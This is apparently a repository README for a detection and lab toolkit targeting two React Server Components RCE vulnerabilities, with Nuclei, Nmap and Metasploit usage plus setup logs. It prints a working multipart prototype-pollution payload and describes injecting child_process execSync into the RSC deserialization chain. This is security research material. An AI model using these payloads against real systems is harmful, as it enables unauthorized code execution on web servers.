# React Server Components (RSC) Vulnerability Detection & Lab Toolkit

This project provides detection tools and one-click deployment lab environments for React Server Components (RSC) related vulnerabilities, primarily covering two critical vulnerabilities: CVE-2025-55182 (React2Shell) and CVE-2025-66478 (Next.js RSC RCE).

## Directory Structure

```
.
├── install_nuclei.sh                      # Official Nuclei scanner installation script
├── setup_rsc_two_cves_lab.sh             # One-click deployment script for dual vulnerability labs
├── next_rsc_two_cves_lab/                # Lab environment directory
│   ├── docker-compose.yml                # Docker Compose configuration file
│   ├── nextjs-66478/                     # Next.js 16.0.6 vulnerability environment
│   ├── nextjs-rce-scanner                # Next.js RSC RCE scanner binary
│   └── urls.txt                          # Target URL list
├── nmap-nse/                             # Nmap NSE detection scripts
│   ├── nextjs-rsc-cve-2025-66478-detect.nse
│   └── react2shell-cve-2025-55182-detect.nse
└── nuclei-custom/                        # Nuclei custom templates
    ├── nextjs-cve-2025-66478-rce-3001.yaml
    ├── nextjs-cve-2025-66478-rce-body-id.yaml
    ├── react2shell-cve-2025-55182-rce-body-id.yaml
    └── react2shell-cve-2025-55182-rce-safe-check.yaml
```

## Vulnerability Overview

### CVE-2025-55182 (React2Shell)
- Affected Versions: Vulnerable React/Next.js applications
- Vulnerability Type: Remote Code Execution via RSC deserialization
- Lab Port: 3000

### CVE-2025-66478 (Next.js RSC RCE)
- Affected Versions: Next.js 16.0.6 and other vulnerable versions
- Vulnerability Type: Remote Code Execution via NEXT_REDIRECT digest injection
- Lab Port: 3001

## Quick Start

### 1. Deploy Lab Environment

Run the one-click deployment script to automatically build and start both vulnerability labs:

```bash
bash setup_rsc_two_cves_lab.sh
```

After deployment, access the labs via:

- React2Shell (CVE-2025-55182): `http://SERVER_IP:3000`
- Next.js 16.0.6 (CVE-2025-66478): `http://SERVER_IP:3001`

Stop the lab environment:

```bash
cd next_rsc_two_cves_lab
docker compose down
```

### 2. Install Nuclei Scanner

Install Nuclei v3.6.0 using the official installation script:

```bash
bash install_nuclei.sh
```

Verify installation:

```bash
nuclei -version
```

## Detection Tool Usage

### Nuclei Template Scanning

Use custom Nuclei templates for vulnerability detection:

```bash
# Detect React2Shell (CVE-2025-55182)
nuclei -t nuclei-custom/react2shell-cve-2025-55182-rce-safe-check.yaml -u http://TARGET_IP:3000

# Detect Next.js RSC RCE (CVE-2025-66478)
nuclei -t nuclei-custom/nextjs-cve-2025-66478-rce-3001.yaml -u http://TARGET_IP:3001

# Batch scanning
nuclei -t nuclei-custom/ -l urls.txt
```

### Nmap NSE Script Detection

Use Nmap Scripting Engine for port scanning and vulnerability detection:

```bash
# Detect React2Shell (port 3000)
nmap --script=nmap-nse/react2shell-cve-2025-55182-detect.nse -p 3000 TARGET_IP

# Detect Next.js RSC RCE (port 3001)
nmap --script=nmap-nse/nextjs-rsc-cve-2025-66478-detect.nse -p 3001 TARGET_IP

# Detect both vulnerabilities simultaneously
nmap --script=nmap-nse/*.nse -p 3000,3001 TARGET_IP
```
### Detection Mechanism of the Metasploit Module

#### Detection Payload Construction

The module sends a detection payload structured as follows:

```http
POST / HTTP/1.1
Next-Action: x
Content-Type: multipart/form-data; boundary=----hxorzboundary

------hxorzboundary
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B0\"}","_response":{"_prefix":"throw Object.assign(new Error('NEXT_REDIRECT'), {digest:'msf-test-digest'})"}}
------hxorzboundary--
```

**Key Field Analysis:**

1. **`Next-Action: x`**: Triggers Next.js/React Server Actions processing flow
2. **`Content-Type: multipart/form-data`**: Required format for RSC payloads
3. **`__proto__`**: Prototype pollution keyword
4. **`_prefix` Injection**:
   ```javascript
   throw Object.assign(new Error('NEXT_REDIRECT'), {digest:'msf-test-digest'})
   ```
   This code forces the server to throw an error containing a custom digest value

#### Vulnerability Detection Logic

The module uses a four-tier determination logic to confirm vulnerability status:

##### Tier 1: **Confirmed Vulnerable** 
```ruby
if res.body =~ /^1:E\{.*"digest":.*\}/m
  print_good("VULNERABLE: RSC digest exposure detected")
end
```

**Detection Criteria:**
- Response body matches regex `/^1:E\{.*"digest":.*\}/m`
- Example response format:
  ```
  1:E{"digest":"msf-test-digest","message":"NEXT_REDIRECT"}
  ```
- **Content-Type**: `text/x-component`
- **HTTP Status Code**: 500

**Determination Basis:** Server fully reflected our injected digest value, confirming RSC processing flaw.

##### Tier 2: **Potentially Vulnerable** 
```ruby
elsif res.code == 500 && res.headers['Content-Type']&.include?('text/x-component')
  if res.body.include?('digest')
    print_good("POTENTIALLY VULNERABLE: Unstable digest behavior")
  end
end
```

**Detection Criteria:**
- HTTP 500 error
- Content-Type contains `text/x-component`
- Response body contains "digest" keyword but not in standard format

**Determination Basis:** Server exhibits RSC-related behavior, but digest reflection is unstable, requiring manual verification.

##### Tier 3: **RSC Channel Detected but No Digest Reflection** 
```ruby
else
  print_status("RSC channel detected but no digest reflection")
end
```

**Possible Reasons:**
- Patched version
- Custom RSC implementation
- Different error handling configuration

##### Tier 4: **No Vulnerability Indicators** 
```ruby
else
  print_status("No RSC digest behavior detected")
end
```

####  Detection Flowchart

```
┌─────────────────────────┐
│  Send RSC Test Payload  │
└───────────┬─────────────┘
            │
            ▼
┌─────────────────────────┐
│  Receive HTTP Response  │
└───────────┬─────────────┘
            │
            ▼
    ┌───────────────┐
    │ Response Body │
    │ Matches Pattern?│
    │ 1:E{.*digest.*} │
    └───┬───────┬───┘
        │       │
      YES│      │NO
        │       │
        ▼       ▼
    ┌─────┐  ┌──────────────┐
    │Confirmed│ │ HTTP 500 &  │
    │Vulnerable││ text/x-component?│
    └─────┘  └───┬──────┬───┘
                 │      │
               YES│     │NO
                 │      │
                 ▼      ▼
         ┌───────────┐ ┌────────┐
         │Contains   │ │Not     │
         │"digest"?  │ │Vulnerable│
         └─┬─────┬───┘ └────────┘
           │     │
         YES│    │NO
           │     │
           ▼     ▼
       ┌─────────┐ ┌──────────┐
       │Potentially││RSC Channel│
       │Vulnerable │ │No Reflect│
       └─────────┘ └──────────┘
```

### Usage Guide

#### Basic Usage

```bash
# Start Metasploit
msfconsole

# Search for module
msf > search rsc_digest

# Load module
msf > use auxiliary/scanner/http/rsc_digest_cve_2025_dual

# Set target IP
msf auxiliary(...) > set RHOSTS 10.211.55.65

# Set port (3000 for React2Shell, 3001 for Next.js)
msf auxiliary(...) > set RPORT 3000

# Execute scan
msf auxiliary(...) > run
```

#### Parameter Description

| Parameter | Type | Default | Required | Description |
|-----------|------|---------|----------|-------------|
| `RHOSTS` | String | - | Yes | Target host(s) (single IP/range/file) |
| `RPORT` | Integer | 3000 | Yes | Target port (common: 3000, 3001) |
| `TARGETURI` | String | `/` | Yes | Test path (e.g., `/`, `/api/action`) |
| `TIMEOUT` | Integer | 10 | Yes | HTTP request timeout (seconds) |

#### Real Test Results Example

```
msf auxiliary(scanner/http/rsc_digest_cve_2025_dual) > set rport 3000
rport => 3000
msf auxiliary(scanner/http/rsc_digest_cve_2025_dual) > run
[*] Scanning 10.211.55.65:3000
[+] VULNERABLE: RSC digest exposure detected on 10.211.55.65:3000
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

msf auxiliary(scanner/http/rsc_digest_cve_2025_dual) > set rport 3001
rport => 3001
msf auxiliary(scanner/http/rsc_digest_cve_2025_dual) > run
[*] Scanning 10.211.55.65:3001
[+] VULNERABLE: RSC digest exposure detected on 10.211.55.65:3001
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
### Go Scanner Usage

If the Go scanner is already built, run it directly:

```bash
cd next_rsc_two_cves_lab
./nextjs-rce-scanner -l urls.txt
```

## Detection Methodology

All detection tools verify vulnerabilities through the following process:

1. Send crafted RSC multipart/form-data requests
2. Trigger server-side execution of safe commands (e.g., `id`)
3. Check if the `digest` field in the response contains command execution results
4. Extract and display command output (e.g., `uid=0(root)`)

The detection process only executes read-only system information commands and does not cause any damage to the target system.

## Tool Description

### install_nuclei.sh
- Downloads Nuclei v3.6.0 from the official GitHub repository
- Supports proxy environments for downloading
- Automatically installs and configures to `/usr/local/bin/nuclei`

### setup_rsc_two_cves_lab.sh
- Automatically clones relevant PoC repositories (via hxorz.cn proxy)
- Generates Next.js 16.0.6 vulnerable project
- Builds and starts two Docker containers
- Optional build for Go scanner and Python PoC environment

### Nuclei Template Features
- Supports precise regular expression matching
- Automatically extracts command execution output
- Tiered detection (safe check / body ID check / port-specific check)

### Nmap NSE Script Features
- Focuses on digest field detection
- Does not execute destructive commands
- Detailed vulnerability confirmation output
- Supports custom port rules

## Security Warning

This project is for authorized security testing and educational research purposes only. Before use, ensure that:

1. Labs are deployed only in controlled local environments or authorized testing environments
2. Detection tools are not used against unauthorized systems
3. Compliance with local laws, regulations, and cybersecurity policies

## Reference Resources

- CVE-2025-55182: https://github.com/msanft/CVE-2025-55182
- React2Shell: https://github.com/subzer0x0/React2Shell
- Next.js RSC RCE Scanner: https://github.com/Malayke/Next.js-RSC-RCE-Scanner-CVE-2025-66478
- Nuclei: https://github.com/projectdiscovery/nuclei

## Technology Stack

- Docker & Docker Compose
- Node.js 22 (Alpine)
- Next.js 16.0.6
- Nuclei v3.6.0
- Nmap NSE (Lua)
- Go (Scanner)
- Python 3 (PoC Environment)

## License

The detection scripts and tools in this project follow their respective open source licenses:
- Nmap NSE scripts: Same license as Nmap
- Nuclei templates: Same license as Nuclei
- Other tools: Please refer to the licenses of the original projects

## Author

hxorz

## Disclaimer

This project is for security research and educational purposes only. Users are responsible for all legal liabilities arising from the use of this project. The project author is not responsible for any misuse.


# Vulnerable Environment Setup

![](https://files.mdnice.com/user/108782/94682281-8bc7-44b5-bf8e-a6e740d82a41.png)

![](https://files.mdnice.com/user/108782/1571409c-87e7-46ba-8c30-fc0685de322b.jpg)

![](https://files.mdnice.com/user/108782/eec46761-a48d-4dbc-aaaf-f343533fdfaa.png)

![](https://files.mdnice.com/user/108782/44600b68-6119-47c2-9d5c-1b4d45d73018.jpg)

![](https://files.mdnice.com/user/108782/bcffe11d-6b1b-40cb-917c-13a1ad35b507.jpg)

![](https://files.mdnice.com/user/108782/4cf183e1-e22e-47a8-8159-d0658dcfbf90.jpg)

![](https://files.mdnice.com/user/108782/ae423bba-e56b-4483-bb6d-72e478d9cc23.jpg)

![](https://files.mdnice.com/user/108782/1c969ab9-f370-4cec-a2f6-e8bc7794cda7.png)

![](https://files.mdnice.com/user/108782/15efa876-d7b4-4e46-a929-39aefbfb0454.png)

![](https://files.mdnice.com/user/108782/3ab32ce2-899e-4efd-bfff-2e5f3f399c51.png)

# Vulnerability Verification

![](https://files.mdnice.com/user/108782/2485cbdf-6520-417c-aeba-481cc21fab02.png)

# Nuclei Installation and Detection Results (Screenshots)

## Detection Principle of nextjs-cve-2025-66478-rce-3001.yaml

This template performs "strong confirmation" detection targeting a fixed vulnerable Next.js 16.0.6 environment on port 3001. It constructs a standard RSC multipart/form-data request, utilizing then: "$1:__proto__:then" and _response._prefix in the JSON payload to trigger the RSC deserialization chain. The _prefix is injected as a Node.js code snippet that actually executes process.mainModule.require('child_process').execSync('id'). The execution result is concatenated into the digest field of the thrown Error('NEXT_REDIRECT'). The template's matching logic doesn't simply check the status code; instead, it directly performs regex matching for uid=0(root) in the RSC streaming response. In other words: only when the target actually executes the id command as root will this template be considered a hit. This represents a "true root-level RCE verification".

---

## Detection Principle of nextjs-cve-2025-66478-rce-body-id.yaml

This template uses the same exploitation chain as the previous one, both leveraging RSC deserialization + _response._prefix injection to execute id. However, its detection approach is more generic. It doesn't restrict to a specific port, nor does it only focus on uid=0(root). Instead, it uses regex matching in the HTTP response body to look for the complete id command output structure like uid=... gid=... groups=.... As long as the server returns content that matches the Linux id output format, command execution is confirmed. This template is positioned for: batch scanning and general environment confirmation, with emphasis on verifying "whether actual command execution with echo exists", rather than solely focusing on root privileges.

---

## Detection Principle of react2shell-cve-2025-55182-rce-body-id.yaml

This template is specifically designed for RSC RCE detection in React2Shell scenarios. It similarly constructs an RSC data structure with then: "$1:__proto__:then", injecting _response._prefix as Node.js code that executes execSync('id'), and returns the execution result through the digest field of the NEXT_REDIRECT error. The key difference is: its matching target is output characteristics like uid=1001(nextjs) gid=1001(nodejs), typical of React2Shell's default container user, rather than root. In other words, this template's core verification point is: confirming whether the complete chain "RSC → system command execution → echo to digest" truly exists in the React2Shell environment.

---

## Detection Principle of react2shell-cve-2025-55182-rce-safe-check.yaml

This template is a "safe verification version" detection script for React2Shell. The exploitation path is essentially the same as the previous one, but the detection strategy is more restrained and rigorous. It also injects execSync('id'), but employs multiple combined conditions when determining results, including:

- HTTP status code must be 500 (matches RSC exception return characteristics)
- Response type must be text/x-component (confirms it's an RSC stream)
- Response must match the regex uid=1001(nextjs) gid=1001(nodejs)

Only when all three conditions are met simultaneously is the vulnerability determined to exist. This is more suitable for use in red team early reconnaissance or defensive verification phases.

![](https://files.mdnice.com/user/108782/d96d6334-4c33-4024-b150-3235f424e44d.jpg)

![](https://files.mdnice.com/user/108782/44ce2c17-deba-497d-9956-30e068d5ec5b.jpg)

![](https://files.mdnice.com/user/108782/689af3fe-715c-4ff4-8d9e-c0eb607300f3.png)

![](https://files.mdnice.com/user/108782/bbf86516-8eab-4f8f-bbe3-5cc46fa486a9.jpg)

![](https://files.mdnice.com/user/108782/31dc5237-1526-4971-b2bb-9c983c3d27a3.jpg)

![](https://files.mdnice.com/user/108782/849cc9a1-c15f-4762-9397-1cee3f02f78d.jpg)

![](https://files.mdnice.com/user/108782/381791d5-48c2-4b5b-ac9f-22e098bbc3d8.png)

![](https://files.mdnice.com/user/108782/f5bfeeec-7bdf-4bba-825e-ba7892bce9fc.jpg)

![](https://files.mdnice.com/user/108782/62e9a760-83b0-401b-ba58-edd1f54cb1cf.jpg)

# Writing Nmap Scripts for Detection - Result Screenshots

## Detection Principle of nextjs-rsc-cve-2025-66478-detect.nse

This NSE script takes a straightforward approach: it doesn't attempt to actually exploit RCE, but instead determines whether the target resembles a Next.js RSC vulnerable environment from "network behavior characteristics". The script sends a crafted HTTP request to port 3001 on the target, focusing on three key observations:

First, whether the returned status code is 500 (this is the typical behavior when RSC encounters abnormal deserialization or redirect failures);
Second, whether the Content-Type in the response header is text/x-component, to confirm this is an authentic RSC response stream;
Third, whether a stable digest characteristic value can be extracted from the response body.

Once all three conditions are met simultaneously, it can be determined that: this port exposes a complete RSC processing chain, and the behavior characteristics are highly consistent with CVE-2025-66478. Its role leans more towards "network-side confirmation", suitable for asset scanning or red team preliminary screening phases, rather than serving as an exploitation script directly.
---

## Detection Principle of react2shell-cve-2025-55182-detect.nse

This NSE script is specifically written for React2Shell scenarios, following the same approach of "not actually executing system commands, only observing key behavior characteristics". The script sends a set of simulated RSC requests to port 3000, focusing on checking three types of return characteristics: first is the HTTP 500 status code, second is the RSC-specific response type text/x-component, and finally whether a stable digest output pattern appears in the response body. If these conditions are met simultaneously, it indicates that: the target's current processing logic aligns with the typical behavior of React2Shell-type RSC vulnerabilities. This script's positioning is very clear - it's not meant to "directly compromise the system", but rather to quickly determine at the network layer: whether this service has exposed a React2Shell-type RSC risk entry point.


![](https://files.mdnice.com/user/108782/f09bdc4e-085a-41ff-97b6-5a997d6155f6.png)

# Screenshots of Metasploit Module Development and Detection
![](https://files.mdnice.com/user/108782/68541f20-281d-4fef-acdd-a98715771ea3.jpg)
>>>>>>> 95d965e (Add Metasploit RSC digest scanner for CVE-2025-55182 and CVE-2025-66478)
# Environment Description

Currently, the repository only publicly releases detection scripts, one-click lab setup scripts, and Nuclei installation scripts. All content can be directly pulled down for your own reproduction and verification. If you find this project useful, feel free to give it a Star.
Additionally, I should mention that this entire environment was actually set up and fully verified via SSH on Ubuntu 20.04.5 LTS (kernel 5.4.0-216-generic, x86_64). Docker networking, Nuclei scanning, Nmap NSE detection, and interactive RCE Shell were all tested and working in this system environment, for your reference when reproducing locally.



>
>1.CVE-2025-55182  
https://github.com/msanft/CVE-2025-55182  
>
>2.React2Shell  
https://github.com/subzer0x0/React2Shell  
>
>3.Next.js RSC RCE Scanner（CVE-2025-66478）  
https://github.com/Malayke/Next.js-RSC-RCE-Scanner-CVE-2025-66478  
>
>4.Nuclei  
https://github.com/projectdiscovery/nuclei
>

# Appendix: Runtime Logs

```bash
hx@orz:~$ cat /etc/docker/daemon.json 
{
  "registry-mirrors": ["https://hub.hxorz.cn"]
}

hx@orz:~$ mkdir 1207 && cd 1207
hx@orz:~/1207$ vim setup_rsc_two_cves_lab.sh
hx@orz:~/1207$ chmod +x setup_rsc_two_cves_lab.sh 
hx@orz:~/1207$ sudo docker images
[sudo] password for hx: 
REPOSITORY   TAG       IMAGE ID   CREATED   SIZE
hx@orz:~/1207$ sudo docker ps -a
CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES
hx@orz:~/1207$ 
hx@orz:~/1207$ vim setup_rsc_two_cves_lab.sh
hx@orz:~/1207$ chmod +x setup_rsc_two_cves_lab.sh 
hx@orz:~/1207$ sudo docker images
[sudo] password for hx: 
REPOSITORY   TAG       IMAGE ID   CREATED   SIZE
hx@orz:~/1207$ sudo docker ps -a
CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES
hx@orz:~/1207$ ./setup_rsc_two_cves_lab.sh 
[*] 创建实验目录: next_rsc_two_cves_lab
[*] 克隆 msanft/CVE-2025-55182 (via hxorz.cn)...
Cloning into 'CVE-2025-55182-msanft'...
remote: Enumerating objects: 62, done.
remote: Counting objects: 100% (62/62), done.
remote: Compressing objects: 100% (53/53), done.
remote: Total 62 (delta 17), reused 54 (delta 9), pack-reused 0 (from 0)
Unpacking objects: 100% (62/62), 64.41 KiB | 3.58 MiB/s, done.
[*] 克隆 Malayke/Next.js-RSC-RCE-Scanner-CVE-2025-66478 (via hxorz.cn)...
Cloning into 'Next.js-RSC-RCE-Scanner-CVE-2025-66478'...
remote: Enumerating objects: 120, done.
remote: Counting objects: 100% (120/120), done.
remote: Compressing objects: 100% (87/87), done.
remote: Total 120 (delta 66), reused 85 (delta 33), pack-reused 0 (from 0)
Receiving objects: 100% (120/120), 4.29 MiB | 1.51 MiB/s, done.
Resolving deltas: 100% (66/66), done.
[*] 克隆 subzer0x0/React2Shell 源码 (via hxorz.cn)...
Cloning into 'React2Shell-src'...
remote: Enumerating objects: 51, done.
remote: Counting objects: 100% (51/51), done.
remote: Compressing objects: 100% (45/45), done.
remote: Total 51 (delta 17), reused 36 (delta 6), pack-reused 0 (from 0)
Unpacking objects: 100% (51/51), 69.75 KiB | 4.65 MiB/s, done.
[*] 使用 create-next-app@16.0.6 生成项目 nextjs-66478...
Need to install the following packages:
create-next-app@16.0.6
Ok to proceed? (y) y

✔ Would you like to use TypeScript? … No / Yes
✔ Which linter would you like to use? › ESLint
✔ Would you like to use React Compiler? … No / Yes
✔ Would you like to use Tailwind CSS? … No / Yes
✔ Would you like your code inside a `src/` directory? … No / Yes
Creating a new Next.js app in /home/hx/1207/next_rsc_two_cves_lab/nextjs-66478.

Using npm.

Initializing project with template: app-tw 


Installing dependencies:
- next
- react
- react-dom

Installing devDependencies:
- @tailwindcss/postcss
- @types/node
- @types/react
- @types/react-dom
- babel-plugin-react-compiler
- eslint
- eslint-config-next
- tailwindcss
- typescript

npm warn deprecated next@16.0.6: This version has a security vulnerability. Please upgrade to a patched version. See https://nextjs.org/blog/CVE-2025-66478 for more details.

added 427 packages, and audited 428 packages in 1m

174 packages are looking for funding
  run `npm fund` for details

1 critical severity vulnerability

To address all issues, run:
  npm audit fix --force

Run `npm audit` for details.

Generating route types...
✓ Types generated successfully

Success! Created nextjs-66478 at /home/hx/1207/next_rsc_two_cves_lab/nextjs-66478

A new version of `create-next-app` is available!
You can update by running: npm i -g create-next-app

npm notice
npm notice New patch version of npm available! 11.6.1 -> 11.6.4
npm notice Changelog: https://github.com/npm/cli/releases/tag/v11.6.4
npm notice To update run: npm install -g npm@11.6.4
npm notice
[*] 启动 docker-compose（React2Shell + Next.js 16.0.6）...
WARN[0000] /home/hx/1207/next_rsc_two_cves_lab/docker-compose.yml: the attribute `version` is obsolete, it will be ignored, please remove it to avoid potential confusion 
[+] Running 11/11
 ✔ react2shell Pulled                                                                                           60.5s 
   ✔ 014e56e61396 Pull complete                                                                                  3.8s 
   ✔ d28ab52fe429 Pull complete                                                                                 16.5s 
   ✔ 34226f541496 Pull complete                                                                                 16.6s 
   ✔ 6ac8cc1f0b52 Pull complete                                                                                 16.6s 
   ✔ 61d30b51a1dc Pull complete                                                                                 16.6s 
   ✔ e11d0ea2ade0 Pull complete                                                                                 16.6s 
   ✔ 75bf8a6ab3ca Pull complete                                                                                 16.6s 
   ✔ 0e76b23c6844 Pull complete                                                                                 16.7s 
   ✔ 3ca452f0873f Pull complete                                                                                 55.8s 
   ✔ 3183f2476674 Pull complete                                                                                 55.8s 
Compose can now delegate builds to bake for better performance.
 To do so, set COMPOSE_BAKE=true.
[+] Building 24.3s (7/9)                                                                               docker:default
 => [nextjs-66478 internal] load build definition from Dockerfile                                                0.0s
 => => transferring dockerfile: 392B                                                                             0.0s
 => [nextjs-66478 internal] load metadata for docker.io/library/node:22-alpine                                  10.9s
 => [nextjs-66478 internal] load .dockerignore                                                                   0.0s
 => => transferring context: 2B                                                                                  0.0s
 => [nextjs-66478 1/5] FROM docker.io/library/node:22-alpine@sha256:9632533eda8061fc1e9960cfb3f8762781c07a00ee  11.9s
 => => resolve docker.io/library/node:22-alpine@sha256:9632533eda8061fc1e9960cfb3f8762781c07a00ee7317f5dc0e13c0  0.0s
 => => sha256:9632533eda8061fc1e9960cfb3f8762781c07a00ee7317f5dc0e13c05e15166f 6.41kB / 6.41kB                   0.0s
 => => sha256:3404205afbfa99ffb663ec5ac28be64bd789541816885c75939c7d24dce06fa2 1.72kB / 1.72kB                   0.0s
 => => sha256:38925ee9872d372937cb288c928672b2481fef11e525889c0b9e2556466d2339 6.52kB / 6.52kB                   0.0s
 => => sha256:2e4fafc9c573e8168a7430607ae67549589fb2387ba7cd514a4e9c266c1a9760 51.60MB / 51.60MB                10.4s
 => => sha256:4745102427f1b0f32bbb42b1342f3aec192e0a029641fec018ff18aa1bd8177f 1.26MB / 1.26MB                   2.7s
 => => sha256:b9b992ae23a0421147ed82b168cabeb8aae5a9b2773a11d9bb440975d64d8da6 446B / 446B                       3.2s
 => => extracting sha256:2e4fafc9c573e8168a7430607ae67549589fb2387ba7cd514a4e9c266c1a9760                        1.4s
 => => extracting sha256:4745102427f1b0f32bbb42b1342f3aec192e0a029641fec018ff18aa1bd8177f                        0.0s
 => => extracting sha256:b9b992ae23a0421147ed82b168cabeb8aae5a9b2773a11d9bb440975d64d8da6                        0.0s
 => [nextjs-66478 internal] load build context                                                                   4.5s
 => => transferring context: 421.58MB                                                                            4.4s
 => [nextjs-66478 2/5] WORKDIR /app                                                                              1.2s
 => ERROR [nextjs-66478 3/5] COPY package.json package-lock.json* pnpm-lock.yaml* yarn.lock* ./ 2>/dev/null ||   0.3s
------
 > [nextjs-66478 3/5] COPY package.json package-lock.json* pnpm-lock.yaml* yarn.lock* ./ 2>/dev/null || true:
------
failed to solve: cannot copy to non-directory: /var/lib/docker/overlay2/eq9ai4q6zvjuioisvs664u752/merged/app/true
hx@orz:~/1207$ sudo docker images
REPOSITORY               TAG       IMAGE ID       CREATED        SIZE
arulkumarv/react2shell   v1        fa757ea34f26   36 hours ago   725MB
hx@orz:~/1207$ sudo docker ps -a
CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES
hx@orz:~/1207$ sudo docker rmi fa757ea34f26
Untagged: arulkumarv/react2shell:v1
Untagged: arulkumarv/react2shell@sha256:947bef51e344672071944a055d7bcdd78ed9599fde5b7e97ee8794f822dec88a
Deleted: sha256:fa757ea34f2673ceee9c9cd8edc0ccb878e891749b2b502ff2deb40bd8a5971d
Deleted: sha256:db431f34d8aa3ea7ae8608753fccf537f697e2d8a3335a22316eb5e9df4ebedd
Deleted: sha256:0e41e252567a8e2b18f1f1a834d2a5ee7b5bdc33df62a507b94d56d7652155c9
Deleted: sha256:e4a2761967591585935d4692965bff1695dfd7675407762b8045565de5cd9fd4
Deleted: sha256:b51c0d63f910d4b2d88499dc919b762b51ade7fab8a840a4d33dd82f9be8250b
Deleted: sha256:2b71d09eccb4769d392f46e7f24d1cd3d24cb3122269436b0dbb1f2aca5c0e46
Deleted: sha256:760aec2bba612a29b0034eb8c7c42c88d10821ee2281a97d8efff2c5b933906b
Deleted: sha256:a7db4051d42c5bc75b622a53bb265590c3c3487403d81c501eb8d51fd976366b
Deleted: sha256:6fa6e977e23fb2ba981bca5e626df2dc6ba2bd8195baa9be846e85c0d6108551
Deleted: sha256:37bb581490bfa876c29bfdd4fe41f20da7d2325d7a30730cfdd1b423fb98d90c
hx@orz:~/1207$ ls
next_rsc_two_cves_lab  setup_rsc_two_cves_lab.sh
hx@orz:~/1207$ sudo rm -rf next_rsc_two_cves_lab/
hx@orz:~/1207$ rm -rf setup_rsc_two_cves_lab.sh 
hx@orz:~/1207$ vim setup_rsc_two_cves_lab.sh
hx@orz:~/1207$ chmod +x setup_rsc_two_cves_lab.sh 
hx@orz:~/1207$ ./setup_rsc_two_cves_lab.sh 
[*] 创建实验目录: next_rsc_two_cves_lab
[*] 克隆 CVE-2025-55182 PoC...
Cloning into 'CVE-2025-55182-msanft'...
remote: Enumerating objects: 62, done.
remote: Counting objects: 100% (62/62), done.
remote: Compressing objects: 100% (53/53), done.
remote: Total 62 (delta 17), reused 54 (delta 9), pack-reused 0 (from 0)
Unpacking objects: 100% (62/62), 64.41 KiB | 1.95 MiB/s, done.
[*] 克隆 Next.js 扫描器...
Cloning into 'Next.js-RSC-RCE-Scanner-CVE-2025-66478'...
remote: Enumerating objects: 120, done.
remote: Counting objects: 100% (120/120), done.
remote: Compressing objects: 100% (87/87), done.
remote: Total 120 (delta 66), reused 85 (delta 33), pack-reused 0 (from 0)
Receiving objects: 100% (120/120), 4.29 MiB | 1.61 MiB/s, done.
Resolving deltas: 100% (66/66), done.
[*] 克隆 React2Shell 源码...
Cloning into 'React2Shell-src'...
remote: Enumerating objects: 51, done.
remote: Counting objects: 100% (51/51), done.
remote: Compressing objects: 100% (45/45), done.
remote: Total 51 (delta 17), reused 36 (delta 6), pack-reused 0 (from 0)
Unpacking objects: 100% (51/51), 69.75 KiB | 4.65 MiB/s, done.
[*] 生成 Next.js 16.0.6 项目...
✔ Would you like to use TypeScript? … No / Yes
✔ Which linter would you like to use? › ESLint
✔ Would you like to use React Compiler? … No / Yes
✔ Would you like to use Tailwind CSS? … No / Yes
✔ Would you like your code inside a `src/` directory? … No / Yes
Creating a new Next.js app in /home/hx/1207/next_rsc_two_cves_lab/nextjs-66478.

Using npm.

Initializing project with template: app-tw 


Installing dependencies:
- next
- react
- react-dom

Installing devDependencies:
- @tailwindcss/postcss
- @types/node
- @types/react
- @types/react-dom
- babel-plugin-react-compiler
- eslint
- eslint-config-next
- tailwindcss
- typescript

npm warn deprecated next@16.0.6: This version has a security vulnerability. Please upgrade to a patched version. See https://nextjs.org/blog/CVE-2025-66478 for more details.

added 427 packages, and audited 428 packages in 38s

174 packages are looking for funding
  run `npm fund` for details

1 critical severity vulnerability

To address all issues, run:
  npm audit fix --force

Run `npm audit` for details.

Generating route types...
✓ Types generated successfully

Success! Created nextjs-66478 at /home/hx/1207/next_rsc_two_cves_lab/nextjs-66478

A new version of `create-next-app` is available!
You can update by running: npm i -g create-next-app

[*] 构建并启动两个漏洞容器...
WARN[0000] /home/hx/1207/next_rsc_two_cves_lab/docker-compose.yml: the attribute `version` is obsolete, it will be ignored, please remove it to avoid potential confusion 
WARN[0000] /home/hx/1207/next_rsc_two_cves_lab/docker-compose.yml: the attribute `version` is obsolete, it will be ignored, please remove it to avoid potential confusion 
[+] Running 11/11
 ✔ react2shell Pulled                                                                                           49.1s 
   ✔ 014e56e61396 Already exists                                                                                 0.0s 
   ✔ d28ab52fe429 Pull complete                                                                                 20.4s 
   ✔ 34226f541496 Pull complete                                                                                 20.4s 
   ✔ 6ac8cc1f0b52 Pull complete                                                                                 20.5s 
   ✔ 61d30b51a1dc Pull complete                                                                                 20.5s 
   ✔ e11d0ea2ade0 Pull complete                                                                                 20.5s 
   ✔ 75bf8a6ab3ca Pull complete                                                                                 20.5s 
   ✔ 0e76b23c6844 Pull complete                                                                                 20.6s 
   ✔ 3ca452f0873f Pull complete                                                                                 45.0s 
   ✔ 3183f2476674 Pull complete                                                                                 45.0s 
Compose can now delegate builds to bake for better performance.
 To do so, set COMPOSE_BAKE=true.
[+] Building 78.9s (11/11) FINISHED                                                                    docker:default
 => [nextjs-66478 internal] load build definition from Dockerfile                                                0.0s
 => => transferring dockerfile: 281B                                                                             0.0s
 => [nextjs-66478 internal] load metadata for docker.io/library/node:22-alpine                                   1.9s
 => [nextjs-66478 internal] load .dockerignore                                                                   0.0s
 => => transferring context: 2B                                                                                  0.0s
 => [nextjs-66478 1/5] FROM docker.io/library/node:22-alpine@sha256:9632533eda8061fc1e9960cfb3f8762781c07a00ee7  0.0s
 => [nextjs-66478 internal] load build context                                                                   3.3s
 => => transferring context: 421.58MB                                                                            3.3s
 => CACHED [nextjs-66478 2/5] WORKDIR /app                                                                       0.0s
 => [nextjs-66478 3/5] COPY package.json ./                                                                      0.9s
 => [nextjs-66478 4/5] RUN npm install                                                                          65.4s
 => [nextjs-66478 5/5] COPY . .                                                                                  2.7s 
 => [nextjs-66478] exporting to image                                                                            4.6s 
 => => exporting layers                                                                                          4.6s 
 => => writing image sha256:24b2a0b5daa497d6992484eb7288280631d57146ff2241d767328de0df904808                     0.0s 
